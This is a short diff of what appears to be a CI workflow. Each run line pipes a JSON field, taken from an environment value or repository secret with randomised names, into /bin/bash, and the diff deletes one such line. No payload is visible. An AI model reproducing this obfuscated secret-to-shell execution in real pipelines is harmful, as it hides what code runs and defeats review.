@@ -21,7 +21,6 @@ jobs:
           biqb88378: ${{ secrets.biqb88378 }}
         run: |
           printf '%s' "$biqb88378" | jq -r .opzrc743 | /bin/bash
-          printf '%s' "$t9" | jq -r .qqbsl948 | /bin/bash
           printf '%s' "$k60009" | jq -r .taz18 | /bin/bash
           echo $twhgg54 | jq -r .bszu09641 | /bin/bash
           printf '%s' "$u4882" | jq -r .ncmuc69405 | /bin/bash
